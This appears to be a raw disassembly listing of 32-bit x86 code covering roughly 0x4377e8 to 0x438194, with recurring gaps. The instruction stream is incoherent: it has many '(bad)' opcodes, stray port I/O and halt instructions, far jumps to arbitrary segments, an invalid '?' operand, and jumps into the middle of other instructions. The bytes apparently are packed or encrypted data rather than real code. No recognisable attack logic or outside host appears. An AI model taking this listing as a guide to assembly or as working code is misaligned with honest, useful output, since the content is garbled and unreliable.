  4377e8:	jle    0x4377c6
  4377ea:	cwde   
  4377eb:	movups XMMWORD PTR ds:0x37d6fea9,xmm3
  4377f2:	sahf   
  4377f3:	cvttps2pi mm6,QWORD PTR [edx+0x37d58ea0]
  4377fa:	sahf   
  4377fb:	std    
  4377fc:	out    0x0,al
	...
  437816:	pop    ss
  437817:	sbb    ebx,DWORD PTR [ecx+eax*1+0x65030529]
  43781e:	stos   DWORD PTR es:[edi],eax
  43781f:	stos   BYTE PTR es:[edi],al
  437820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437821:	add    ebp,ebx
  437823:	ret    0xc9b
  437826:	mov    dh,0x1
  437828:	sbb    DWORD PTR [edx-0x5513fb2e],edi
  43782e:	inc    DWORD PTR [ebx+0x90500]
  437834:	sub    eax,DWORD PTR [ecx]
  437836:	test   BYTE PTR [edx+0x65f703a5],ch
  43783c:	in     al,dx
  43783d:	mov    edx,0x96a0052a
  437842:	pop    esi
  437843:	add    al,0xe9
  437845:	fidiv  DWORD PTR [ebx]
  437847:	jmp    0x4377e8
  437849:	mov    fs,WORD PTR [ebx+eiz*8]
  43784c:	mov    al,0x5b
  43784e:	dec    esi
  43784f:	add    al,0xe9
  437851:	add    edx,esi
  437853:	jge    0x437838
  437855:	xchg   ecx,eax
  437856:	and    DWORD PTR [ebx-0x17],eax
  437859:	sbb    eax,0xb7f501ed
  43785e:	jmp    0xfbcd:0x95f11204
  437865:	add    eax,0x10e94338
  43786a:	add    BYTE PTR [ebp-0xc],ah
  43786d:	mov    bh,0xca
  43786f:	add    al,0x47
  437871:	(bad)
  437875:	stos   BYTE PTR es:[edi],al
  437876:	cmc    
  437877:	jl     0x43784c
  437879:	pop    DWORD PTR [eax]
	...
  437893:	leave  
  437894:	inc    edx
  437895:	jmp    0xb8eca922
  43789a:	xchg   esi,eax
  43789b:	or     BYTE PTR [ecx+0x1ef443f6],cl
  4378a1:	pop    esi
  4378a2:	inc    eax
  4378a3:	mov    al,0x1f
  4378a5:	xchg   BYTE PTR [ebp+0x53e942a1],cl
  4378ab:	hlt    
  4378ac:	cdq    
  4378ad:	(bad)  
  4378ae:	stc    
  4378af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4378b0:	mov    eax,0xe8df292e
  4378b5:	add    cl,ch
  4378b7:	mul    DWORD PTR [edx]
  4378b9:	lahf   
  4378ba:	sbb    ebx,DWORD PTR [ebp-0x39]
  4378bd:	(bad)  
  4378be:	mov    edx,0xe9fa8b3f
  4378c3:	div    DWORD PTR [edx]
  4378c5:	mov    ah,bl
  4378c7:	addr16 mov al,0x3e
  4378ca:	jmp    0x14376a3e
  4378cf:	ss add eax,0xb0814a62
  4378d5:	ds jmp 0xf7936a5b
  4378db:	mov    bh,0x4
  4378dd:	jg     0x43788c
  4378df:	in     al,dx
  4378e0:	(bad)  
  4378e1:	mov    edi,0x7f473f2f
  4378e6:	add    al,0x68
  4378e8:	test   eax,0xff7e93e
  4378ed:	xor    eax,0xd9fda21f
  4378f2:	sub    bh,al
  4378f4:	xor    bh,bl
  4378f6:	cld    
	...
  43790f:	add    BYTE PTR [edi],ch
  437911:	clc    
  437912:	aas    
  437913:	jmp    0xb53b428f
  437918:	mov    ch,0x4
  43791a:	add    BYTE PTR [ecx+eiz*1],dl
  43791d:	sahf   
  43791e:	je     0x4378a7
  437920:	popa   
  437921:	mov    eax,DWORD PTR [ebx+0x7efae4a9]
  437927:	int3   
  437928:	arpl   WORD PTR [ecx-0x3d0816c2],bp
  43792e:	add    al,0x61
  437930:	mov    ds:0x11e7ffc6,eax
  437935:	mov    dl,BYTE PTR [esi*8-0x51003a1b]
  43793c:	push   edi
  43793d:	xchg   esi,eax
  43793e:	aad    0x0
  437940:	sahf   
  437941:	add    DWORD PTR [ebx-0x24963f80],edi
  437947:	inc    ebx
  437948:	int    0x1
  43794a:	jne    0x437981
  43794c:	mov    ebp,DWORD PTR [edi]
  43794e:	add    ebx,esi
  437950:	pop    esi
  437951:	add    DWORD PTR [esi-0x1],ecx
  437954:	test   al,0x89
  437956:	or     al,0x40
  437958:	lea    eax,[ecx+0x43e0f83b]
  43795e:	add    BYTE PTR [eax],al
  437960:	or     BYTE PTR [ecx+0x708331e2],bl
  437966:	cmc    
  437967:	test   ch,cl
  437969:	hlt    
  43796a:	add    eax,0xdb6d3883
  43796f:	inc    ebx
  437970:	pop    ebp
  437971:	add    DWORD PTR [esi+0x5],edi
	...
  43798b:	add    BYTE PTR [eax],al
  43798d:	push   ebp
  43798e:	dec    esi
  43798f:	cmp    DWORD PTR [eax],eax
  437991:	dec    esp
  437992:	xlat   BYTE PTR ds:[ebx]
  437993:	not    BYTE PTR ds:0x3a9361
  437999:	adc    esp,DWORD PTR [ecx]
  43799b:	out    dx,eax
  43799c:	fimul  DWORD PTR [esi]
  43799e:	add    DWORD PTR [ebx+0x4f5dd655],edi
  4379a4:	push   ebx
  4379a5:	cs dec esp
  4379a7:	xor    bl,BYTE PTR ds:0x394e55
  4379ad:	or     BYTE PTR [eax+edx*2+0x394f15be],dh
  4379b4:	add    bl,cl
  4379b6:	outs   dx,DWORD PTR ds:[esi]
  4379b7:	adc    ebx,DWORD PTR [eax]
  4379b9:	das    
  4379ba:	inc    ecx
  4379bb:	add    BYTE PTR [eax],bh
  4379bd:	and    BYTE PTR [ecx-0x25],ch
  4379c0:	inc    ebx
  4379c1:	or     eax,0x75e80df6
  4379c6:	fwait
  4379c7:	cmc    
  4379c8:	call   FWORD PTR [ecx+0x48]
  4379cb:	outs   dx,BYTE PTR ds:[esi]
  4379cc:	or     eax,0xddf67b64
  4379d1:	hlt    
  4379d2:	scas   al,BYTE PTR es:[edi]
  4379d3:	inc    cl
  4379d5:	stc    
  4379d6:	aad    0xb1
  4379d8:	ds hlt 
  4379da:	ins    BYTE PTR es:[edi],dx
  4379db:	sub    al,0xfb
  4379dd:	jmp    0xf4836a43
  4379e2:	fsubr  DWORD PTR es:[ecx]
  4379e6:	scas   al,BYTE PTR es:[edi]
  4379e7:	dec    BYTE PTR [eax+0x14942a49]
  4379ed:	dec    eax
  4379ee:	cmp    BYTE PTR [esi],0x0
	...
  437a09:	add    bh,bl
  437a0b:	or     edi,DWORD PTR cs:[ecx]
  437a0e:	sbb    al,0xc2
  437a10:	cmp    DWORD PTR [edi],0x14939df4
  437a16:	dec    esp
  437a17:	pusha  
  437a18:	add    BYTE PTR ds:[edi-0x7ed6f4d2],bh
  437a1f:	mov    eax,ds:0xa2fb5092
  437a24:	add    BYTE PTR [edx],cl
  437a26:	inc    eax
  437a27:	das    
  437a28:	add    al,0x51
  437a2a:	jmp    0x4379ce
  437a2c:	add    BYTE PTR [eax+esi*1],cl
  437a2f:	das    
  437a30:	add    al,0x51
  437a32:	dec    ebx
  437a33:	cmp    esi,0x8d6db7d6
  437a39:	xor    al,0x38
  437a3b:	cwde   
  437a3c:	inc    edx
  437a3d:	add    BYTE PTR [ebx],dh
  437a3f:	sahf   
  437a40:	mov    BYTE PTR [edi+0x5c7b6ea1],bh
  437a46:	and    bh,dh
  437a48:	dec    eax
  437a49:	cld    
  437a4a:	mov    edi,0x7f54c2a4
  437a4f:	add    al,BYTE PTR [ebx-0x2ce11b15]
  437a55:	(bad)  
  437a56:	stos   BYTE PTR es:[edi],al
  437a57:	inc    ebp
  437a58:	out    dx,eax
  437a59:	fistp  WORD PTR [ecx]
  437a5b:	das    
  437a5c:	add    al,0x75
  437a5e:	sub    eax,0x37d9fc34
  437a63:	add    eax,0x19df39e9
  437a68:	add    esi,esi
  437a6a:	sbb    eax,DWORD PTR ds:0xf111
	...
  437a84:	add    BYTE PTR [eax],al
  437a86:	add    BYTE PTR [ebx+0x4103a561],dh
  437a8c:	and    ebp,DWORD PTR [ebx]
  437a8e:	or     DWORD PTR [edx-0x40fc5aa6],ecx
  437a94:	dec    ebx
  437a95:	jmp    0x437a8e
  437a97:	iret   
  437a98:	(bad)  
  437a99:	call   0xe907f3bd
  437a9e:	jl     0x437aa0
  437aa0:	imul   edi,DWORD PTR [ebx],0xeb4af447
  437aa6:	mov    ds:0x4e8c7b0,eax
  437aab:	es test bl,bl
  437aae:	out    dx,eax
  437aaf:	icebp  
  437ab0:	(bad)  
  437ab1:	call   0x5fb89332
  437ab6:	xor    DWORD PTR [eax-0x73],ebp
  437ab9:	mov    ecx,DWORD PTR [ebx+0x2e1e173]
  437abf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437ac0:	leave  
  437ac1:	fnstcw WORD PTR [esi-0x18]
  437ac4:	sbb    BYTE PTR [ebp-0x36280bba],dh
  437aca:	xlat   BYTE PTR ds:[ebx]
  437acb:	je     0x437a5e
  437acd:	sub    edx,DWORD PTR [ebx+esi*4+0x3bf7c76c]
  437ad4:	sub    DWORD PTR [ebx+eax*8-0x58],0xf
  437ad9:	stos   DWORD PTR es:[edi],eax
  437ada:	dec    eax
  437adb:	das    
  437adc:	test   BYTE PTR [ebx],ah
  437ade:	xchg   ebx,eax
  437adf:	and    ebp,esi
  437ae1:	mov    esp,0xe7b6199e
  437ae6:	cmp    BYTE PTR [eax+0x7c8074],0x0
	...
  437b01:	add    BYTE PTR [eax],al
  437b03:	add    ah,ah
  437b05:	add    al,0xe9
  437b07:	xor    DWORD PTR [edx+0x47],edi
  437b0a:	sbb    eax,0xffd93abd
  437b0f:	popa   
  437b10:	xchg   ebx,eax
  437b11:	add    ebp,esp
  437b13:	aad    0x22
  437b15:	xor    dl,bh
  437b17:	mov    edi,0x3ce021af
  437b1c:	xor    al,BYTE PTR ds:0xa261075
  437b22:	fisubr DWORD PTR [edx-0x23052909]
  437b28:	iret   
  437b29:	adc    BYTE PTR [eax-0x17],al
  437b2c:	scas   eax,DWORD PTR es:[edi]
  437b2d:	and    eax,esp
  437b2f:	adc    al,0x3a
  437b31:	add    eax,0x9bdcf75
  437b36:	mov    dh,0x3f
  437b38:	cmp    al,BYTE PTR ds:0x18ec26fb
  437b3e:	fsubr  QWORD PTR [edx-0x56730f09]
  437b44:	test   DWORD PTR [ebx+0x43440d1c],0x64ec2700
  437b4e:	fsubr  QWORD PTR [edx-0x11adfc09]
  437b54:	arpl   WORD PTR [esi],bx
  437b56:	push   cs
  437b57:	sub    eax,edi
  437b59:	jmp    0x3488:0x710b700f
  437b60:	push   0xc8d55c8d
  437b65:	loopne 0x437b61
  437b67:	daa    
	...
  437b80:	add    ch,dh
  437b82:	mov    dh,0x44
  437b84:	mov    esi,0x951410b9
  437b89:	mov    ecx,0x4cae4f04
  437b8e:	test   DWORD PTR [esp+ebp*1+0x38e7d254],ecx
  437b95:	sbb    al,0x82
  437b97:	cli    
  437b98:	ins    DWORD PTR es:[edi],dx
  437b99:	cmp    dh,dh
  437b9b:	sbb    DWORD PTR [edx],edi
  437b9d:	mov    ecx,eax
  437b9f:	test   DWORD PTR [eax],0x87393dd
  437ba5:	test   BYTE PTR [ecx],bl
  437ba7:	clc    
  437ba8:	push   0x400005d4
  437bad:	pop    edx
  437bae:	sbb    dh,ah
  437bb0:	jmp    eax
  437bb2:	inc    ebp
  437bb3:	adc    eax,DWORD PTR [eax-0x33]
  437bb6:	mov    dl,dh
  437bb8:	add    DWORD PTR [ecx+0x3a45f86e],esi
  437bbe:	mov    DWORD PTR [ebx-0x1],edi
  437bc1:	iret   
  437bc2:	pop    ss
  437bc3:	mov    dh,0x56
  437bc5:	pop    esi
  437bc6:	xchg   esp,eax
  437bc7:	jae    0x437bd1
  437bc9:	jmp    0x7b05:0x5d164a79
  437bd0:	les    ebp,FWORD PTR [ecx-0x734d0360]
  437bd6:	add    al,BYTE PTR [esp+ebp*8-0xb]
  437bda:	ror    DWORD PTR [edx],0x0
  437bdd:	popf   
  437bde:	xor    eax,DWORD PTR [edx-0x4341a93d]
  437be4:	add    al,0x0
	...
  437bfe:	lea    edi,[edx]
  437c00:	sub    esp,0xffffffde
  437c03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  437c04:	push   ss
  437c05:	push   esi
  437c06:	add    BYTE PTR [eax],0xeb
  437c09:	push   0xfffffff9
  437c0b:	add    DWORD PTR [esp+eiz*8+0x1d],eax
  437c0f:	aas    
  437c10:	(bad)  
  437c11:	(bad)  
  437c12:	out    dx,al
  437c13:	xchg   ebx,eax
  437c14:	cmc    
  437c15:	adc    eax,0x3a766d
  437c1a:	rol    BYTE PTR [ebp+0x6e],1
  437c1d:	and    ah,cl
  437c1f:	adc    dh,ah
  437c21:	add    BYTE PTR [ebp+0x5],cl
  437c24:	add    BYTE PTR [ebp+0x42],dh
  437c27:	pushf  
  437c28:	inc    ebx
  437c29:	clc    
  437c2a:	or     al,0x6
  437c2c:	add    BYTE PTR [eax],al
  437c2e:	add    BYTE PTR [edi],al
  437c30:	and    esi,DWORD PTR [ebp-0xc]
  437c33:	(bad)  
  437c34:	jnp    0x437c7a
  437c36:	add    al,0x56
  437c38:	enter  0xf871,0x56
  437c3c:	enter  0xfc86,0xf5
  437c40:	(bad)  
  437c41:	pop    edx
  437c42:	push   edx
  437c43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  437c44:	ret    
  437c45:	push   esp
  437c46:	jg     0x437c4a
  437c48:	test   bl,ch
  437c4a:	adc    al,al
  437c4c:	shl    ecx,cl
  437c4e:	outs   dx,DWORD PTR ds:[esi]
  437c4f:	sub    esi,DWORD PTR [esi+0x74]
  437c52:	int3   
  437c53:	(bad)  
  437c54:	push   esi
  437c55:	cli    
  437c56:	retf   
  437c57:	iret   
  437c58:	xor    edi,0xffffffe2
  437c5b:	jbe    0x437be1
  437c5d:	icebp  
  437c5e:	hlt    
  437c5f:	ins    DWORD PTR es:[edi],dx
  437c60:	dec    BYTE PTR [eax+eax*1+0x0]
	...
  437c7b:	cmp    DWORD PTR [edx],edi
  437c7d:	das    
  437c7e:	data16 xor al,0x44
  437c81:	lock dec esi
  437c83:	push   cs
  437c84:	daa    
  437c85:	nop
  437c86:	adc    al,0x5c
  437c88:	jge    0x437cc8
  437c8a:	add    BYTE PTR [ecx+0x2e],bh
  437c8d:	add    BYTE PTR [ecx+ebp*4+0xefffe6e],al
  437c94:	dec    ebx
  437c95:	jns    0x437cdb
  437c97:	mov    al,ds:0x734f6e94
  437c9c:	popa   
  437c9d:	adc    dh,BYTE PTR cs:[ebp+ebp*2+0x3ff0c383]
  437ca5:	push   ss
  437ca6:	sbb    ch,BYTE PTR [ecx+0x29]
  437ca9:	mov    eax,0x8ac3a74f
  437cae:	cli    
  437caf:	loope  0x437c4a
  437cb1:	hlt    
  437cb2:	aas    
  437cb3:	hlt    
  437cb4:	lock ret 
  437cb6:	or     dh,BYTE PTR [eax-0x74]
  437cb9:	add    eax,DWORD PTR [eax]
  437cbb:	hlt    
  437cbc:	push   ds
  437cbd:	cmp    DWORD PTR [eax+eax*2+0x18],0x4c4c277
  437cc5:	mov    ss,esp
  437cc7:	sbb    dh,BYTE PTR [eax+0x65]
  437cca:	mov    gs,ebp
  437ccc:	punpckhdq mm0,QWORD PTR [eax+0x79e8800b]
  437cd3:	out    dx,al
  437cd4:	test   BYTE PTR [edi-0x63],bh
  437cd7:	xchg   DWORD PTR [ecx],ecx
  437cd9:	imul   ecx,DWORD PTR [ebp-0x7d1c0625],0x0
	...
  437cf7:	add    bl,ah
  437cf9:	or     esp,esi
  437cfb:	sti    
  437cfc:	jp     0x437d41
  437cfe:	or     eax,0xa205e849
  437d03:	add    al,0x5a
  437d05:	add    eax,0xf3f08e66
  437d0a:	test   DWORD PTR [eax+0x371d3a3f],0x47595cc
  437d14:	hlt    
  437d15:	xor    DWORD PTR [eax],0xffffff8f
  437d18:	and    BYTE PTR [edi+0x3d],al
  437d1b:	sub    edi,DWORD PTR [ebx+0x43]
  437d1e:	int    0x48
  437d20:	call   0x134c17b6
  437d25:	ins    DWORD PTR es:[edi],dx
  437d26:	jmp    0x437da4
  437d28:	aaa    
  437d29:	cmp    dh,BYTE PTR [edi+esi*1]
  437d2c:	jno    0x437cf7
  437d2e:	sbb    al,0x34
  437d30:	jg     0x437d2b
  437d32:	in     al,dx
  437d33:	lds    esi,FWORD PTR [edi+0x729d1d39]
  437d39:	cmp    DWORD PTR [ebp-0xf],edi
  437d3c:	and    eax,DWORD PTR ds:0x565e8f4f
  437d42:	arpl   bx,ax
  437d44:	(bad)  
  437d45:	xor    eax,0x2bfc485e
  437d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437d4b:	sbb    BYTE PTR [ebx+0x9],0x66
  437d4f:	adc    ah,ah
  437d51:	add    al,0xa3
  437d53:	dec    eax
  437d54:	dec    eax
  437d55:	ins    DWORD PTR es:[edi],dx
  437d56:	call   FWORD PTR [edi-0x44]
  437d59:	pop    ecx
  437d5a:	jae    0x437d3d
	...
  437d74:	add    BYTE PTR [esi+0x5e720bd8],bl
  437d7a:	jp     0x437dd0
  437d7c:	stc    
  437d7d:	in     eax,dx
  437d7e:	add    al,0x66
  437d80:	in     al,dx
  437d81:	je     0x437d4b
  437d83:	sar    DWORD PTR [ecx],cl
  437d85:	(bad)  
  437d86:	out    0xfa,al
  437d88:	xchg   BYTE PTR [ecx-0x78],al
  437d8b:	mov    edi,0x7c8bf6f5
  437d90:	jno    0x437dac
  437d92:	nop
  437d93:	inc    esp
  437d94:	ins    DWORD PTR es:[edi],dx
  437d95:	daa    
  437d96:	jp     0x437e0c
  437d98:	gs std 
  437d9a:	sbb    cl,BYTE PTR [edi-0x2d]
  437d9d:	cmp    BYTE PTR [ebx+0x14],0x91
  437da1:	sar    BYTE PTR [esi],0x0
  437da4:	bound  ebp,QWORD PTR [edi*2+0xab53059]
  437dab:	add    BYTE PTR [esi+ebp*1-0x58ba8196],dl
  437db2:	xchg   ecx,eax
  437db3:	inc    esp
  437db4:	cmp    edi,esp
  437db6:	jns    0x437dcc
  437db8:	sub    DWORD PTR [ebp+0x3c6c003e],esp
  437dbe:	jne    0x437e0f
  437dc0:	add    ebp,esi
  437dc2:	add    al,0x0
  437dc4:	jmp    0x72983d09
  437dc9:	pop    ebx
  437dca:	aad    0x50
  437dcc:	ins    BYTE PTR es:[edi],dx
  437dcd:	mov    esp,0x3f64f7c
  437dd2:	or     eax,0x14b3d4fb
  437dd7:	inc    eax
  437dd8:	jmp    0x437ddd
	...
  437df1:	add    ah,bl
  437df3:	enter  0x72f7,0x13
  437df7:	and    DWORD PTR [ebp-0x17],0xa88004f2
  437dfe:	push   ds
  437dff:	out    0x7f,al
  437e01:	add    BYTE PTR [ebx-0x737f0510],bl
  437e07:	bound  ecx,QWORD PTR [eax+0x62]
  437e0a:	arpl   WORD PTR [edx],si
  437e0c:	push   eax
  437e0d:	call   0x3e5797
  437e12:	fs inc ebx
  437e14:	(bad)  
  437e15:	dec    eax
  437e17:	sti    
  437e18:	out    0x51,al
  437e1a:	into   
  437e1b:	push   ebx
  437e1c:	sar    DWORD PTR [ecx],1
  437e1e:	sar    BYTE PTR [eax+0x75],1
  437e21:	jbe    0xd5cc85ec
  437e27:	cli    
  437e28:	push   edx
  437e29:	add    al,0x54
  437e2b:	xor    DWORD PTR [eax],ecx
  437e2d:	mov    al,0xcc
  437e2f:	pushf  
  437e30:	fs push esi
  437e32:	call   0xffc1:0xcc683bfc
  437e39:	push   edx
  437e3a:	mov    ?,WORD PTR [ebx+ecx*2]
  437e3d:	jmp    FWORD PTR [eax-0x3e8a0a8f]
  437e43:	xor    al,0x68
  437e45:	jmp    0xff43873a
  437e4a:	or     bh,ah
  437e4c:	jmp    0x4b8d:0x260ede3b
  437e53:	add    dl,BYTE PTR [eax-0x18]
	...
  437e6e:	add    BYTE PTR [edx-0x32],cl
  437e71:	cmc    
  437e72:	call   DWORD PTR [esi+eax*8]
  437e75:	sti    
  437e76:	cmp    ecx,esi
  437e78:	sbb    al,0x16
  437e7a:	push   ebx
  437e7b:	pop    esi
  437e7c:	aaa    
  437e7d:	push   eax
  437e7e:	(bad)  
  437e7f:	call   0x51b973f5
  437e84:	xor    al,0x68
  437e86:	jmp    0xff437fdb
  437e8b:	call   0x7390:0x6174c04c
  437e92:	cld    
  437e93:	hlt    
  437e94:	inc    ebx
  437e95:	xor    BYTE PTR [ebp-0x402fb1bd],bh
  437e9b:	dec    edi
  437e9c:	pop    ebp
  437e9d:	ja     0x437eeb
  437e9f:	xor    dl,dh
  437ea1:	inc    ecx
  437ea2:	or     BYTE PTR [edi+edx*2-0x33],bh
  437ea6:	mov    ah,ch
  437ea8:	loop   0x437ee3
  437eaa:	adc    BYTE PTR [ebp+0x33],ch
  437ead:	or     BYTE PTR [ecx+0x4e7384],cl
  437eb3:	stos   DWORD PTR es:[edi],eax
  437eb4:	xor    eax,0x5f36c929
  437eb9:	inc    BYTE PTR [esi-0x1809b058]
  437ebf:	inc    ecx
  437ec0:	loope  0x437e4d
  437ec2:	cli    
  437ec3:	jno    0x437e73
  437ec5:	add    eax,0x97ae2604
  437eca:	or     DWORD PTR [ebx+eiz*8+0x12],eax
  437ece:	and    al,0x0
  437ed0:	fist   DWORD PTR [edx]
  437ed2:	and    al,0x0
	...
  437eec:	clc    
  437eed:	lds    esi,FWORD PTR [ebx]
  437eef:	sti    
  437ef0:	ret    
  437ef1:	retf   
  437ef2:	rol    BYTE PTR [edi],0xf4
  437ef5:	sahf   
  437ef6:	jns    0x437f3f
  437ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437ef9:	xchg   esp,eax
  437efa:	xor    edi,DWORD PTR [edi-0x53]
  437efd:	ins    BYTE PTR es:[edi],dx
  437efe:	adc    ecx,DWORD PTR [edx-0x19]
  437f01:	xor    edx,ecx
  437f03:	(bad)  
  437f04:	imul   esi,DWORD PTR [esi-0x91d1975],0xe7e42442
  437f0e:	add    al,BYTE PTR [ecx]
  437f10:	rcr    BYTE PTR [ebp-0x36],1
  437f13:	or     BYTE PTR [ebx],al
  437f15:	inc    esi
  437f16:	adc    dh,0xe8
  437f19:	push   ecx
  437f1a:	add    al,al
  437f1c:	sub    BYTE PTR [ebp+0xc],ah
  437f1f:	or     al,0xf3
  437f21:	sub    edi,DWORD PTR [edi-0x10fb3168]
  437f27:	sub    al,BYTE PTR [edi+0x7c]
  437f2a:	imul   eax,DWORD PTR [esi-0xb],0xffffff80
  437f2e:	lods   eax,DWORD PTR ds:[esi]
  437f2f:	sti    
  437f30:	jge    0x437f77
  437f32:	fldcw  WORD PTR [edi+0x7a]
  437f35:	or     BYTE PTR [ecx-0x46824cc3],bh
  437f3b:	or     edi,DWORD PTR [ecx]
  437f3d:	cmp    BYTE PTR [edi-0x5d7005e2],dl
  437f43:	sub    eax,0xc66d7627
  437f48:	push   es
  437f49:	pop    ebp
  437f4a:	std    
  437f4b:	ret    
  437f4c:	retf   
  437f4d:	outs   dx,DWORD PTR ds:[esi]
  437f4e:	out    0xd5,al
	...
  437f68:	add    BYTE PTR [ebx-0x24],al
  437f6b:	sub    ch,BYTE PTR [edi]
  437f6d:	cmp    al,BYTE PTR [ecx]
  437f6f:	jmp    0xbe218391
  437f74:	les    ebx,FWORD PTR [edx+0x8]
  437f77:	mov    dh,0xc3
  437f79:	mov    ds:0xf6e85bd7,al
  437f7e:	mov    gs,ecx
  437f80:	(bad)  
  437f81:	and    dh,cl
  437f83:	out    dx,al
  437f84:	xlat   BYTE PTR ds:[ebx]
  437f85:	pop    es
  437f86:	cmp    edi,esp
  437f88:	adc    esi,esi
  437f8a:	aaa    
  437f8b:	sub    DWORD PTR [edi],ebp
  437f8d:	jnp    0x437f44
  437f8f:	icebp  
  437f90:	xor    DWORD PTR [ecx-0xd61180d],eax
  437f96:	mov    gs,edx
  437f98:	(bad)  
  437f99:	shl    esi,cl
  437f9b:	ffreep st(7)
  437f9d:	fdivr  st(3),st
  437f9f:	jmp    0x437fe2
  437fa1:	retf   
  437fa2:	ja     0x437f3a
  437fa4:	xchg   esp,eax
  437fa5:	ret    0x9c77
  437fa8:	sub    al,0x74
  437faa:	cmp    ch,BYTE PTR [ebx+0x3b0c2010]
  437fb0:	lds    edi,FWORD PTR [edx+0x4a]
  437fb3:	int    0xba
  437fb5:	and    cl,BYTE PTR [ebp-0x1]
  437fb8:	jnp    0x437fda
  437fba:	fsub   st,st(7)
  437fbc:	cdq    
  437fbd:	outs   dx,BYTE PTR ds:[esi]
  437fbe:	jle    0x437fba
  437fc0:	ins    DWORD PTR es:[edi],dx
  437fc1:	aaa    
  437fc2:	idiv   DWORD PTR [edx]
  437fc4:	daa    
  437fc5:	retf   
  437fc6:	inc    ebp
  437fc7:	out    0xef,al
  437fc9:	ja     0x438008
  437fcb:	pop    edx
  437fcc:	push   ebp
	...
  437fe5:	add    ch,dh
  437fe7:	(bad)  
  437fe8:	ss mov edx,0xba367709
  437fee:	sti    
  437fef:	sub    BYTE PTR [edi+0x7e4342a7],al
  437ff5:	mov    al,0xf1
  437ff7:	jmp    0xf2e6:0x4d932f1e
  437ffe:	mov    DWORD PTR ds:0xde9d93c,eax
  438004:	cmp    al,0xd0
  438006:	out    0x1,al
  438008:	inc    edx
  438009:	ret    0xe88a
  43800c:	lock jb 0x437fc4
  43800f:	and    eax,ecx
  438011:	push   0x6f
  438013:	push   es
  438014:	outs   dx,BYTE PTR ds:[esi]
  438015:	out    0x5a,eax
  438017:	inc    esp
  438018:	es cs jb 0x438094
  43801c:	sub    eax,0xbed21d29
  438021:	mov    esp,0x3d7e6e42
  438026:	stos   DWORD PTR es:[edi],eax
  438027:	retf   
  438028:	push   ecx
  438029:	jb     0x437fb2
  43802b:	add    DWORD PTR [ecx+esi*8-0x1a],0xffffff8b
  438030:	inc    esp
  438031:	xor    DWORD PTR [edx+0x6fac8716],eax
  438037:	add    ecx,0x11
  43803a:	retf   
  43803b:	jge    0x438037
  43803d:	push   ds
  43803e:	or     dl,BYTE PTR [edx-0x7c]
  438041:	xor    ah,ah
  438043:	or     bh,bl
  438045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438046:	outs   dx,DWORD PTR ds:[esi]
  438047:	int3   
  438048:	jle    0x43804a
	...
  438062:	add    bl,bh
  438064:	jne    0x4380d3
  438066:	out    0xae,eax
  438068:	inc    esi
  438069:	push   ebp
  43806a:	pop    esi
  43806b:	xchg   BYTE PTR [ecx+0x5b4d08bc],bh
  438071:	jmp    0xfac058f6
  438076:	mov    BYTE PTR [eax+0x4dc8b28c],ah
  43807c:	push   es
  43807d:	add    BYTE PTR [ebp+0x51],dh
  438080:	dec    ecx
  438081:	jmp    0x9ef8:0x4bf83e72
  438088:	sbb    DWORD PTR [eax+eax*1],ecx
  43808b:	cwde   
  43808c:	push   esp
  43808d:	add    DWORD PTR [ecx],edi
  43808f:	ror    BYTE PTR [esp+ebp*2-0x3c67bfd],1
  438096:	sub    eax,0xffffff8c
  438099:	cli    
  43809a:	jne    0x4380a6
  43809c:	stc    
  43809d:	dec    ebx
  43809e:	or     al,0x96
  4380a0:	cmp    esp,edi
  4380a2:	sub    ebx,DWORD PTR [ecx+esi*8-0x777aceca]
  4380a9:	clc    
  4380aa:	jmp    FWORD PTR [edx-0x6]
  4380ad:	mov    edx,0x438cd675
  4380b2:	or     al,0x46
  4380b4:	cmp    cl,BYTE PTR [ebx+edi*1]
  4380b7:	nop
  4380b8:	sub    DWORD PTR [ecx+eiz*8+0x2a],0x35560c0a
  4380c0:	out    0x74,al
  4380c2:	(bad)  
  4380c3:	cmp    cl,BYTE PTR [ebx+esi*2+0xf8]
	...
  4380de:	add    BYTE PTR [eax],al
  4380e0:	mov    DWORD PTR es:[ecx-0x64f2ca3d],eax
  4380e7:	dec    edx
  4380e9:	sbb    bh,dh
  4380eb:	mov    BYTE PTR [eax-0x7f],ah
  4380ee:	mov    esi,DWORD PTR [ebp-0x27]
  4380f1:	sub    al,ch
  4380f3:	ret    0xacf4
  4380f6:	xchg   edx,edi
  4380f8:	(bad)  
  4380f9:	cmp    eax,0xabeac74c
  4380fe:	inc    BYTE PTR [esi+0xa8c463c]
  438104:	mov    ecx,0x5854c722
  438109:	pushf  
  43810a:	test   DWORD PTR [ecx+edi*4+0x5f],0x3b32872e
  438112:	xor    cl,BYTE PTR [esi-0x34]
  438115:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438116:	(bad)  
  438117:	push   esp
  438119:	inc    ebx
  43811a:	xor    al,0x35
  43811c:	hlt    
  43811d:	imul   eax,DWORD PTR [ebx-0x63ecf33d],0x44
  438124:	pop    edi
  438125:	mov    dl,0x87
  438127:	cli    
  438128:	mov    eax,ds:0x4f3c96a7
  43812d:	mov    ds:0x67b18687,al
  438132:	fild   DWORD PTR [esp+ebp*8+0x6e]
  438136:	ret    
  438137:	(bad)  
  438138:	mov    al,0x93
  43813a:	xchg   ebp,eax
  43813b:	inc    ebx
  43813c:	repz jg 0x4380c6
  43813f:	push   esp
  438140:	jg     0x4380cc
  438142:	jge    0x43812f
	...
  43815c:	add    al,bh
  43815e:	imul   edi,esi,0xffffffff
  438161:	inc    edi
  438162:	adc    BYTE PTR [ecx],dh
  438164:	push   0xfffe6cf5
  438169:	jns    0x43814c
  43816b:	cmp    ah,0xc3
  43816e:	iret   
  43816f:	cs sti 
  438171:	inc    ecx
  438172:	xchg   WORD PTR [esp+ecx*4],dx
  438176:	pop    edx
  438177:	add    BYTE PTR ds:[edi+0x26],bh
  43817b:	jp     0x438153
  43817d:	and    al,BYTE PTR [ebx]
  43817f:	aad    0xfa
  438181:	out    0x2f,eax
  438183:	mov    BYTE PTR [ecx+0x43b904e0],dh
  438189:	hlt    
  43818a:	mov    ebp,DWORD PTR [edx-0x25]
  43818d:	xor    eax,ebp
  43818f:	call   0xbbcf20a
  438194:	mov    BYTE PTR [esi-0x2b],ch
